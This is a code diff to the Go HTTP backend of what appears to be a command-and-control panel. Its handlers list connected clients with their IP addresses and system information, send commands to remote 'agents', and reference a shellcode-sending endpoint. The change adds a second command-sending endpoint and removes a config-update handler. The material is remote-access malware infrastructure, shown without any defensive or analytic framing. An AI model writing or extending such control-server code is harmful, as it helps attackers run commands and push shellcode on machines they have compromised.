@@ -42,7 +42,7 @@ func getClientMessagesHandler(w http.ResponseWriter, r *http.Request) {
 			"id":          client.ID,
 			"ip_address":  client.IPAddress,
 			"last_seen":   client.LastSeen,
-			"system_info": client.SystemInfo,
+			"system_info": client.SystemInfo, // TODO: remove?
 		},
 		"messages": client.Messages, // last 100 messages
 	}
@@ -75,6 +75,41 @@ func sendCommandHandler(w http.ResponseWriter, r *http.Request) {
 
 	// Attempt to send command to active agent
 	if err := network.SendCommandToClient(cmdReq.Client, cmdReq.Command); err != nil {
+		json.NewEncoder(w).Encode(map[string]string{
+			"status": "❌ Failed to send command: " + err.Error(),
+		})
+		return
+	}
+
+	// Success
+	json.NewEncoder(w).Encode(map[string]string{
+		"status": "✅ Command sent to " + cmdReq.Client,
+	})
+}
+
+// =========================
+//
+//	POST /myCommand
+//
+// =========================
+// TODO:
+func mySendCommandHandler(w http.ResponseWriter, r *http.Request) {
+	utils.EnableCORS(&w, r)
+
+	// Handle preflight request
+	if r.Method == "OPTIONS" {
+		return
+	}
+
+	// Decode JSON request body
+	var cmdReq models.CommandRequest // TODO: change?
+	if err := json.NewDecoder(r.Body).Decode(&cmdReq); err != nil {
+		http.Error(w, "Invalid JSON", http.StatusBadRequest)
+		return
+	}
+
+	// Attempt to send command to active agent
+	if err := network.SendMyCommandToClient(cmdReq.Client, cmdReq.Command); err != nil {
 		json.NewEncoder(w).Encode(map[string]string{
 			"status": "❌ Failed to send command: " + err.Error(),
 		})
@@ -193,39 +228,6 @@ func sendShellcodeHandler(w http.ResponseWriter, r *http.Request) {
 
 // =========================
 //
-//	POST /update-config
-//
-// =========================
-// Pushes configuration updates to the agent.
-// This is NOT a shell command — it uses MESSAGE_CONFIG_UPDATE.
-func updateConfigHandler(w http.ResponseWriter, r *http.Request) {
-	utils.EnableCORS(&w, r)
-
-	if r.Method == "OPTIONS" {
-		return
-	}
-
-	var configReq models.ConfigRequest
-	if err := json.NewDecoder(r.Body).Decode(&configReq); err != nil {
-		http.Error(w, "Invalid JSON", http.StatusBadRequest)
-		return
-	}
-
-	// Push config update to agent
-	if err := network.UpdateClientConfig(configReq.Client, configReq.Config); err != nil {
-		json.NewEncoder(w).Encode(map[string]string{
-			"status": "❌ Failed to update config: " + err.Error(),
-		})
-		return
-	}
-
-	json.NewEncoder(w).Encode(map[string]string{
-		"status": "✅ Configuration updated for " + configReq.Client,
-	})
-}
-
-// =========================
-//
 //	GET /client/info
 //
 // =========================
@@ -249,5 +251,5 @@ func getClientInfoHandler(w http.ResponseWriter, r *http.Request) {
 	}
 
 	// Return system information directly
-	json.NewEncoder(w).Encode(client.SystemInfo)
+	json.NewEncoder(w).Encode(client.SystemInfo) // TODO: remove?
 }
